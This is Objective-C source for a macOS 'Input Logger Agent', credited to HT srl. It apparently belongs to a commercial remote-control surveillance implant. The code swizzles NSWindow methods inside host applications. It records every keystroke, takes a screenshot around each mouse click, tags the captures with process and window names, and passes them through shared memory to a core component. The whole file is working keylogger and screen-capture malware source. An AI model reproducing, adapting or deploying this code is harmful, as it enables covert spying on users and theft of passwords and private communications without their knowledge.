/*
 * RCSMac - Input Logger Agent (Mouse and Keyboard)
 * 
 * Created by Alfredo 'revenge' Pesoli on 12/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <objc/objc-class.h>

#import "RCSMAgentInputLogger.h"
#import "RCSMInputManager.h"
#import "RCSMCommon.h"

//#define DEBUG


static int contextHasBeenSwitched = 0;
static NSMutableString *keyBuffer = nil;

int mouseAgentIsActive     = 0;
int keylogAgentIsActive    = 0;

static int width   = 30;
static int height  = 30;

@implementation NSWindow (inputLoggerHook)

// Lookup the next implementation of the given selector after the
// default one. Returns nil if no alternate implementation is found.
- (IMP)getImplementationOf: (SEL)lookup after: (IMP)skip
{
  BOOL found = NO;
  
  Class currentClass = object_getClass(self);
  while (currentClass)
    {
      // Get the list of methods for this class
      unsigned int methodCount;
      Method *methodList = class_copyMethodList(currentClass, &methodCount);
      
      // Iterate over all methods
      unsigned int i;
      for (i = 0; i < methodCount; i++)
        {
          // Look for the selector
          if (method_getName(methodList[i]) != lookup)
            {
              continue;
            }
          
          IMP implementation = method_getImplementation(methodList[i]);
          
          // Check if this is the "skip" implementation
          if (implementation == skip)
            {
              found = YES;
            }
          else if (found)
            {
              // Return the match.
              free(methodList);
              return implementation;
            }
        }
      
      // No match found. Traverse up through super class' methods.
      free(methodList);
      
      currentClass = class_getSuperclass(currentClass);
    }
  return nil;
}

- (void)hookMouse: (NSEvent *)event
{
  [self hookMouse: event];
  
  switch ([event type])
    {
    case NSLeftMouseDown:
      {
        NSString *_windowName;
        
        NSMutableData *processName;
        NSMutableData *windowName;
        
#ifdef DEBUG
        NSLog(@"[event] Left mouse down");
#endif
        
        //
        // Read configuration
        //
        NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
                                                                       forAgent: AGENT_MOUSE
                                                                withCommandType: CM_AGENT_CONF];
        
        if (readData != nil)
          {
#ifdef DEBUG
            NSLog(@"Found configuration for Agent Mouse");
#endif
            shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
            
            NSMutableData *confData = [NSMutableData dataWithBytes: shMemLog->commandData
                                                            length: shMemLog->commandDataSize];
            
            mouseStruct *mouseConfiguration = (mouseStruct *)[confData bytes];
            
            width  = mouseConfiguration->width;
            height = mouseConfiguration->height;
          }
        else
          {
#ifdef DEBUG
            NSLog(@"No configuration found for agent mouse");
#endif
          }
        
#ifdef DEBUG
        NSLog(@"height: %d", height);
        NSLog(@"width: %d", width);
#endif
        
        NSPoint eventLocation = [NSEvent mouseLocation];
        eventLocation.y = 800 - eventLocation.y;
        
        CGImageRef screenShot;
        NSBitmapImageRep *bitmapRep;
        CGSize mouseRectSize = { .width = width, .height = height };
        CGRect mouseRect  = {
          .origin = { .x = eventLocation.x - mouseRectSize.width * 0.5, .y = eventLocation.y - mouseRectSize.height * 0.5 },
          .size   = mouseRectSize,
        };
        
        screenShot = CGWindowListCreateImage(mouseRect,
                                             kCGWindowListOptionOnScreenOnly,
                                             kCGNullWindowID,
                                             kCGWindowImageDefault);
        
        if (screenShot == NULL)
          {
#ifdef DEBUG_ERRORS
            NSLog(@"Error while obtaining screenshot");
#endif
            
            return;
          }
        
        bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
        
        NSData *imageData = [bitmapRep representationUsingType: NSJPEGFileType
                                                    properties: nil];
        
#ifdef DEBUG_VERBOSE_1
        [imageData writeToFile: @"/Users/revenge/Desktop/temp.jpg" atomically: YES];
#endif
        
        //
        // Logging
        //
#ifdef DEBUG
        NSLog(@"Writing block header (MouseAgent)");
#endif

        NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(mouseAdditionalStruct)];
        
        NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
        NSString *_processName      = [processInfo processName];
        
        processName   = [[NSMutableData alloc] initWithData:
                         [_processName dataUsingEncoding:
                          NSUTF16LittleEndianStringEncoding]];
        
        _windowName   = [self title];
        
        windowName    = [[NSMutableData alloc] initWithData:
                         [_windowName dataUsingEncoding:
                          NSUTF16LittleEndianStringEncoding]];

        // Dummy word
        short dummyWord = 0x0000;
        
        mouseAdditionalStruct *mouseAdditionalHeader = (mouseAdditionalStruct *)[entryData bytes];
        mouseAdditionalHeader->version = LOG_MOUSE_VERSION;
        mouseAdditionalHeader->processNameLength = [processName length] + sizeof(dummyWord);
        mouseAdditionalHeader->windowNameLength  = [windowName length] + sizeof(dummyWord);
        mouseAdditionalHeader->x = eventLocation.x - mouseRectSize.width * 0.5;
        mouseAdditionalHeader->y = eventLocation.y - mouseRectSize.height * 0.5;

        NSRect screenRes = [[NSScreen mainScreen] frame];
#ifdef DEBUG
        NSLog(@"screen X: %d", screenRes.origin.x);
        NSLog(@"screen Y: %d", screenRes.origin.y);
#endif
        mouseAdditionalHeader->xMax = screenRes.origin.x;
        mouseAdditionalHeader->yMax = screenRes.origin.y;
        
        // Process Name
        [entryData appendData: processName];
        
        // Null terminator
        [entryData appendBytes: &dummyWord
                        length: sizeof(short)];
                
        // Window Name
        [entryData appendData: windowName];
        // Null terminator
        [entryData appendBytes: &dummyWord
                        length: sizeof(short)];
        
        // Now append the image
        [entryData appendData: imageData];
                
        int leftBytesLength = 0;
        int byteIndex = 0;
        
        if ([entryData length] > MAX_COMMAND_DATA_SIZE)
          {
            do
              {
                NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
                shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
                
                shMemoryHeader->status          = SHMEM_WRITTEN;
                shMemoryHeader->agentID         = AGENT_MOUSE;
                shMemoryHeader->direction       = D_TO_CORE;
                shMemoryHeader->commandType     = CM_LOG_DATA;
                shMemoryHeader->flag            = 0;
                shMemoryHeader->commandDataSize = [entryData length];

                leftBytesLength = (([entryData length] - byteIndex >= 0x300)
                                   ? 0x300
                                   : ([entryData length] - byteIndex));
                
                memcpy(shMemoryHeader->commandData,
                       [entryData bytes] + byteIndex,
                       leftBytesLength);
                
                if ([mSharedMemoryLogging writeMemory: logData
                                               offset: 0
                                        fromComponent: COMP_AGENT] == TRUE)
                  {
#ifdef DEBUG
                    NSLog(@"Mouse click sent through Shared Memory");
#endif
                  }
                else
                  {
#ifdef DEBUG
                    NSLog(@"Error while logging mouse to shared memory");
#endif
                  }
                
                byteIndex += leftBytesLength;
                [logData release];
                
              } while (byteIndex < [entryData length]);
          }
        else
          {
            NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
            shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
            
            shMemoryHeader->status          = SHMEM_WRITTEN;
            shMemoryHeader->agentID         = AGENT_MOUSE;
            shMemoryHeader->direction       = D_TO_CORE;
            shMemoryHeader->commandType     = CM_LOG_DATA;
            shMemoryHeader->flag            = 0;
            shMemoryHeader->commandDataSize = [entryData length];
            
            memcpy(shMemoryHeader->commandData,
                   [entryData bytes],
                   [entryData length]);
            
            if ([mSharedMemoryLogging writeMemory: logData
                                           offset: 0
                                    fromComponent: COMP_AGENT] == TRUE)
              {
#ifdef DEBUG
                NSLog(@"Mouse click sent through Shared Memory");
#endif
              }
            else
              {
#ifdef DEBUG
                NSLog(@"Error while logging mouse to shared memory");
#endif
              }
          }
        
        [entryData release];
        [windowName release];
        [_windowName release];
        [processName release];
        
        [bitmapRep release];
        CGImageRelease(screenShot);
        
        break;
      }
    }
}

- (void)hookKeyboard: (NSEvent *)event
{
  if (keyBuffer == nil)
    keyBuffer = [[NSMutableString alloc] initWithCapacity: KEY_MAX_BUFFER_SIZE];
  
  switch ([event type])
    {
    case NSKeyDown:
      {
        NSString *_windowName;
        
        NSMutableData *logData;
        NSMutableData *processName;
        NSMutableData *windowName;
        NSMutableData *contentData;
        
#ifdef DEBUG
        NSLog(@"[event] Key-pressed: %@", [event characters]);
#endif
        NSString *charCode;
        
        switch ([event keyCode])
          {
          case 0x24: // Enter
            charCode = @"\u21B5\r\n";
            break;
          case 0x33: // Backspace
            charCode = @"\u2408";
            break;
          case 0x35: // Escape
            charCode = @"\u241B";
            break;
          case 0x7b: // UP arrow
            charCode = @"\u2190";
            break;
          case 0x7c: // RIGHT arrow
            charCode = @"\u2192";
            break;
          case 0x7d: // DOWN arrow
            charCode = @"\u2193";
            break;
          case 0x7e: // LEFT arrow
            charCode = @"\u2191";
            break;
          default:
            charCode = [event characters];
            break;
          }
        
        if ([keyBuffer length] < KEY_MAX_BUFFER_SIZE)
          {
            [keyBuffer appendString: charCode];
          }
        else
          {
#ifdef DEBUG
            NSLog(@"[keylogger] Logging 0x10 characters");
#endif
            logData   = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
            
            NSMutableData *entryData = [[NSMutableData alloc] init];

            shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
            short unicodeNullTerminator = 0x0000;
            
            if (contextHasBeenSwitched == 1)
              {
#ifdef DEBUG
                NSLog(@"Writing block header");
#endif
                contextHasBeenSwitched = 0;
                
                NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
                NSString *_processName      = [processInfo processName];
                
                time_t rawtime;
                struct tm *tmTemp;
                
                processName  = [[NSMutableData alloc] initWithData:
                                [_processName dataUsingEncoding:
                                 NSUTF16LittleEndianStringEncoding]];
                
                // Dummy word
                short dummyWord = 0x0000;
                [entryData appendBytes: &dummyWord
                                length: sizeof(short)];
                
                // Struct tm
                time (&rawtime);
                tmTemp = gmtime(&rawtime);
                tmTemp->tm_year += 1900;
                tmTemp->tm_mon  ++;
                
                //
                // Our struct is 0x8 bytes bigger than the one declared on win32
                // this is just a quick fix
                //
#ifdef  __i386__
                [entryData appendBytes: (const void *)tmTemp
                                length: sizeof (struct tm)-0x8];
#else
                [entryData appendBytes: (const void *)tmTemp
                                length: sizeof (struct tm)-0x14];
#endif
              
                // Process Name
                [entryData appendData: processName];
                // Null terminator
                [entryData appendBytes: &unicodeNullTerminator
                                length: sizeof(short)];
                
                _windowName = [self title];
                
                windowName = [[NSMutableData alloc] initWithData:
                              [_windowName dataUsingEncoding:
                               NSUTF16LittleEndianStringEncoding]];

                // Window Name
                [entryData appendData: windowName];
                // Null terminator
                [entryData appendBytes: &unicodeNullTerminator
                                length: sizeof(short)];
                
                // Delimeter
                uint32_t del = DELIMETER;
                [entryData appendBytes: &del
                                length: sizeof(del)];
                
                [_windowName release];
                [processName release];
                [windowName release];
              }
            
            contentData = [[NSMutableData alloc] initWithData:
                           [keyBuffer dataUsingEncoding:
                            NSUTF16LittleEndianStringEncoding]];
            
            // Log buffer
            [entryData appendData: contentData];
            
            shMemoryHeader->status          = SHMEM_WRITTEN;
            shMemoryHeader->agentID         = AGENT_KEYLOG;
            shMemoryHeader->direction       = D_TO_CORE;
            shMemoryHeader->commandType     = CM_LOG_DATA;
            shMemoryHeader->commandDataSize = [entryData length];
            
            memcpy(shMemoryHeader->commandData,
                   [entryData bytes],
                   [entryData length]);
            
            if ([mSharedMemoryLogging writeMemory: logData 
                                           offset: 0
                                    fromComponent: COMP_AGENT] == TRUE)
              {
#ifdef DEBUG_INPUT_LOGGER
                NSLog(@"%s: Logged keyboard: %@ with size %d struct size %d", 
                      __FUNCTION__, 
                      keyBuffer, 
                      shMemoryHeader->commandDataSize,
                      sizeof(shMemoryLog));
#endif
              }
            else
              {
#ifdef DEBUG_INPUT_LOGGER
                NSLog(@"%s: Error while logging keystrokes to shared memory", __FUNCTION__);
#endif
              }
            
            [keyBuffer release];
            [logData release];
            [entryData release];
            [contentData release];
            
            keyBuffer = [[NSMutableString alloc] initWithCapacity: KEY_MAX_BUFFER_SIZE];
            [keyBuffer appendString: charCode];
          }
        
        break;
      }
    default:
      break;
    }
  
  [self hookKeyboard: event];
}

- (void)hookKeyboardAndMouse: (NSEvent *)event
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if (keyBuffer == nil && keylogAgentIsActive == 1)
    {
      keyBuffer = [[NSMutableString alloc] initWithCapacity: KEY_MAX_BUFFER_SIZE];
      contextHasBeenSwitched = 1;
    }

  switch ([event type])
    {
    case NSLeftMouseDown:
      {
        if (mouseAgentIsActive == 1)
          {
            NSString *_windowName;
            
            NSMutableData *processName;
            NSMutableData *windowName;
            
#ifdef DEBUG
            NSLog(@"[event] Left mouse down");
#endif
            
            //
            // Read configuration
            //
            NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
                                                                           forAgent: AGENT_MOUSE
                                                                    withCommandType: CM_AGENT_CONF];
            
            if (readData != nil)
              {
#ifdef DEBUG
                NSLog(@"Found configuration for Agent Mouse");
#endif
                shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
                
                NSMutableData *confData = [NSMutableData dataWithBytes: shMemLog->commandData
                                                                length: shMemLog->commandDataSize];
                
                mouseStruct *mouseConfiguration = (mouseStruct *)[confData bytes];
                
                width  = mouseConfiguration->width;
                height = mouseConfiguration->height;
              }
            else
              {
#ifdef DEBUG
                NSLog(@"No configuration found for agent mouse");
#endif
              }
            
#ifdef DEBUG
            NSLog(@"height: %d", height);
            NSLog(@"width: %d", width);
#endif
            
            NSPoint eventLocation = [NSEvent mouseLocation];
            eventLocation.y = 800 - eventLocation.y;
            
            CGImageRef screenShot;
            NSBitmapImageRep *bitmapRep;
            CGSize mouseRectSize = { .width = width, .height = height };
            CGRect mouseRect  = {
              .origin = { .x = eventLocation.x - mouseRectSize.width * 0.5, .y = eventLocation.y - mouseRectSize.height * 0.5 },
              .size   = mouseRectSize,
            };
            
            screenShot = CGWindowListCreateImage(mouseRect,
                                                 kCGWindowListOptionOnScreenOnly,
                                                 kCGNullWindowID,
                                                 kCGWindowImageDefault);
            
            if (screenShot == NULL)
              {
#ifdef DEBUG_ERRORS
                NSLog(@"Error while obtaining screenshot");
#endif
                
                return;
              }
            
            bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
            NSData *imageData = [bitmapRep representationUsingType: NSJPEGFileType
                                                        properties: nil];
#ifdef DEBUG_VERBOSE_1
            [imageData writeToFile: @"/Users/revenge/Desktop/temp.jpg" atomically: YES];
#endif
            
            //
            // Logging
            //
#ifdef DEBUG
            NSLog(@"Writing block header (MouseAgent)");
#endif
            
            NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(mouseAdditionalStruct)];
            NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
            NSString *_processName      = [[processInfo processName] copy];
            
            processName  = [[NSMutableData alloc] initWithData:
                            [_processName dataUsingEncoding:
                             NSUTF16LittleEndianStringEncoding]];
            
            _windowName = [[self title] copy];
            
            windowName = [[NSMutableData alloc] initWithData:
                          [_windowName dataUsingEncoding:
                           NSUTF16LittleEndianStringEncoding]];
            
            // Dummy word
            short dummyWord = 0x0000;
            
            mouseAdditionalStruct *mouseAdditionalHeader = (mouseAdditionalStruct *)[entryData bytes];
            mouseAdditionalHeader->version           = LOG_MOUSE_VERSION;
            mouseAdditionalHeader->processNameLength = [processName length] + sizeof(dummyWord);
            mouseAdditionalHeader->windowNameLength  = [windowName length] + sizeof(dummyWord);
            mouseAdditionalHeader->x = eventLocation.x - mouseRectSize.width * 0.5;
            mouseAdditionalHeader->y = eventLocation.y - mouseRectSize.height * 0.5;
            
            NSRect screenRes = [[NSScreen mainScreen] frame];
#ifdef DEBUG
            NSLog(@"screen X: %d", screenRes.origin.x);
            NSLog(@"screen Y: %d", screenRes.origin.y);
#endif
            mouseAdditionalHeader->xMax = screenRes.origin.x;
            mouseAdditionalHeader->yMax = screenRes.origin.y;
            
            // Process Name
            [entryData appendData: processName];
            
            // Null terminator
            [entryData appendBytes: &dummyWord
                            length: sizeof(short)];
            
            // Window Name
            [entryData appendData: windowName];
            // Null terminator
            [entryData appendBytes: &dummyWord
                            length: sizeof(short)];
            
            // Now append the image
            [entryData appendData: imageData];
            
            int leftBytesLength = 0;
            int byteIndex = 0;
            
            if ([entryData length] > MAX_COMMAND_DATA_SIZE)
              {
                do
                  {
                    NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
                    shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
                    
                    shMemoryHeader->status          = SHMEM_WRITTEN;
                    shMemoryHeader->agentID         = AGENT_MOUSE;
                    shMemoryHeader->direction       = D_TO_CORE;
                    shMemoryHeader->commandType     = CM_LOG_DATA;
                    shMemoryHeader->flag            = 0;
                    shMemoryHeader->commandDataSize = [entryData length];
                    
                    leftBytesLength = (([entryData length] - byteIndex >= 0x300)
                                       ? 0x300
                                       : ([entryData length] - byteIndex));
                    
                    memcpy(shMemoryHeader->commandData,
                           [entryData bytes] + byteIndex,
                           leftBytesLength);
                    
                    if ([mSharedMemoryLogging writeMemory: logData
                                                   offset: 0
                                            fromComponent: COMP_AGENT] == TRUE)
                      {
#ifdef DEBUG
                        NSLog(@"Mouse click sent through Shared Memory");
#endif
                      }
                    else
                      {
#ifdef DEBUG
                        NSLog(@"Error while logging mouse to shared memory");
#endif
                      }
                    
                    byteIndex += leftBytesLength;
                    [logData release];
                    
                  } while (byteIndex < [entryData length]);
              }
            else
              {
                NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
                shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
                
                shMemoryHeader->status          = SHMEM_WRITTEN;
                shMemoryHeader->agentID         = AGENT_MOUSE;
                shMemoryHeader->direction       = D_TO_CORE;
                shMemoryHeader->commandType     = CM_LOG_DATA;
                shMemoryHeader->flag            = 0;
                shMemoryHeader->commandDataSize = [entryData length];
                
                memcpy(shMemoryHeader->commandData,
                       [entryData bytes],
                       [entryData length]);
                
                if ([mSharedMemoryLogging writeMemory: logData
                                               offset: 0
                                        fromComponent: COMP_AGENT] == TRUE)
                  {
#ifdef DEBUG
                    NSLog(@"Mouse click sent through Shared Memory");
#endif
                  }
                else
                  {
#ifdef DEBUG
                    NSLog(@"Error while logging mouse to shared memory");
#endif
                  }
                
                [logData release];
              }
            
            [entryData release];
            [windowName release];
            [_windowName release];
            [processName release];
            [_processName release];
            [bitmapRep release];
            CGImageRelease(screenShot);
          }
        
        break;
      }
    case NSKeyDown:
      {
        if (keylogAgentIsActive == 1)
          {
            NSString *_windowName;
            
            NSMutableData *logData;
            NSMutableData *processName;
            NSMutableData *windowName;
            NSMutableData *contentData;
            
#ifdef DEBUG
            NSLog(@"[event] Key-pressed: %@", [event characters]);
#endif
            NSString *charCode;
            
            switch ([event keyCode])
              {
                case 0x24: // Enter
                  charCode = @"\u21B5\r\n";
                  break;
                case 0x33: // Backspace
                  charCode = @"\u2408";
                  break;
                case 0x35: // Escape
                  charCode = @"\u241B";
                  break;
                case 0x7b: // UP arrow
                  charCode = @"\u2190";
                  break;
                case 0x7c: // RIGHT arrow
                  charCode = @"\u2192";
                  break;
                case 0x7d: // DOWN arrow
                  charCode = @"\u2193";
                  break;
                case 0x7e: // LEFT arrow
                  charCode = @"\u2191";
                  break;
                default:
                  charCode = [event characters];
                  break;
              }
            
            if ([keyBuffer length] < KEY_MAX_BUFFER_SIZE)
              {
                [keyBuffer appendString: charCode];
              }
            else
              {
#ifdef DEBUG
                NSLog(@"[keylogger] Logging 0x10 characters");
#endif
                logData   = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
                NSMutableData *entryData = [[NSMutableData alloc] init];
                
                shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
                short unicodeNullTerminator = 0x0000;
                
                if (contextHasBeenSwitched == 1)
                  {
#ifdef DEBUG
                    NSLog(@"Writing block header");
#endif
                    contextHasBeenSwitched = 0;
                    
                    NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
                    NSString *_processName      = [[processInfo processName] copy];
                    
                    time_t rawtime;
                    struct tm *tmTemp;
                    
                    processName  = [[NSMutableData alloc] initWithData:
                                    [_processName dataUsingEncoding:
                                     NSUTF16LittleEndianStringEncoding]];
                    
                    // Dummy word
                    short dummyWord = 0x0000;
                    [entryData appendBytes: &dummyWord
                                    length: sizeof(short)];
                    
                    // Struct tm
                    time (&rawtime);
                    tmTemp = gmtime(&rawtime);
                    tmTemp->tm_year += 1900;
                    tmTemp->tm_mon  ++;
                    
                    //
                    // Our struct is 0x8 bytes bigger than the one declared on win32
                    // this is just a quick fix
                    //
                    if (sizeof(long) == 4) // 32bit
                      {
                        [entryData appendBytes: (const void *)tmTemp
                                        length: sizeof (struct tm) - 0x8];
                      }
                    else if (sizeof(long) == 8) // 64bit
                      {
                        [entryData appendBytes: (const void *)tmTemp
                                        length: sizeof (struct tm) - 0x14];
                      }
                    
                    // Process Name
                    [entryData appendData: processName];
                    // Null terminator
                    [entryData appendBytes: &unicodeNullTerminator
                                    length: sizeof(short)];
                    
                    _windowName = [[self title] copy];
                    
                    windowName = [[NSMutableData alloc] initWithData:
                                  [_windowName dataUsingEncoding:
                                   NSUTF16LittleEndianStringEncoding]];
                    
                    // Window Name
                    [entryData appendData: windowName];
                    // Null terminator
                    [entryData appendBytes: &unicodeNullTerminator
                                    length: sizeof(short)];
                    
                    // Delimeter
                    uint32_t del = DELIMETER;
                    [entryData appendBytes: &del
                                    length: sizeof(del)];
                    
                    [_windowName release];
                    [processName release];
                    [_processName release];
                    [windowName release];
                  }
                
                contentData = [[NSMutableData alloc] initWithData:
                               [keyBuffer dataUsingEncoding:
                                NSUTF16LittleEndianStringEncoding]];
                
                // Log buffer
                [entryData appendData: contentData];
                
                shMemoryHeader->status          = SHMEM_WRITTEN;
                shMemoryHeader->agentID         = AGENT_KEYLOG;
                shMemoryHeader->direction       = D_TO_CORE;
                shMemoryHeader->commandType     = CM_LOG_DATA;
                shMemoryHeader->commandDataSize = [entryData length];
                
                memcpy(shMemoryHeader->commandData,
                       [entryData bytes],
                       [entryData length]);
                
                if ([mSharedMemoryLogging writeMemory: logData 
                                               offset: 0
                                        fromComponent: COMP_AGENT] == TRUE)
                  {
#ifdef DEBUG_INPUT_LOGGER
                  NSLog(@"%s: Logged and mouse: %@ with size %d struct size %d", 
                        __FUNCTION__, 
                        keyBuffer, 
                        shMemoryHeader->commandDataSize,
                        sizeof(shMemoryLog));
#endif
                  }
                else
                  {
#ifdef DEBUG_INPUT_LOGGER
                    errorLog(@"Error while logging keystrokes to shared memory %@", keyBuffer);
#endif
                  }
                
                [keyBuffer release];
                [logData release];
                [entryData release];
                [contentData release];
                
                keyBuffer = [[NSMutableString alloc] initWithCapacity: KEY_MAX_BUFFER_SIZE];
                [keyBuffer appendString: charCode];
              }            
          }
                
        break;
      }
    default:
      break;
    }
  
  [outerPool release];
  
  [self hookKeyboardAndMouse: event];
}

- (void)becomeKeyWindowHook
{
  [self becomeKeyWindowHook];
  
  contextHasBeenSwitched = 1;
}

- (void)resignKeyWindowHook
{
  [self resignKeyWindowHook];
  
  contextHasBeenSwitched = 0;
}

@end
